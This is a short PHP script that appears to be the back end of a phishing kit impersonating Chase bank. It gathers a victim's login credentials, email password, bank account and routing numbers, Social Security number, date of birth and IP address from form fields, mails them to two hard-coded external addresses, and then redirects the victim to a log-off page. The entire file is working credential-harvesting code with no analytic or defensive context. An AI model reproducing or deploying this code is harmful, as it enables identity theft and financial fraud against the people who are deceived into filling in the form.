<?

$ip = getenv("REMOTE_ADDR");
$message .= "-------- Login Details ---------\n";
$message .= "Username      : ".$_POST['username']."\n";
$message .= "Password      : ".$_POST['password']."\n";
$message .= "Email Address      : ".$_POST['emailaddy']."\n";
$message .= "Email Pass      : ".$_POST['emailpass']."\n";
$message .= "Email Pass      : ".$_POST['emailpass2']."\n";
$message .= "Account Number     : ".$_POST['accountnum']."\n";
$message .= "Routing Number      : ".$_POST['routingnum']."\n";
$message .= "Social Security number      : ".$_POST['ssn1']."\n";
$message .= "Date Of Birth      : ".$_POST['dob']."\n";
$message .= "IP           : ".$ip."\n";
$message .= "---------Created IMMA----------\n";
$recipient = "soloka2nas@gmail.com,johnsontaylor99@yahoo.com";
$subject = "Chase New Rezult";

mail($recipient,$subject,$message,$headers);
header("Location: LogOff.html");
?>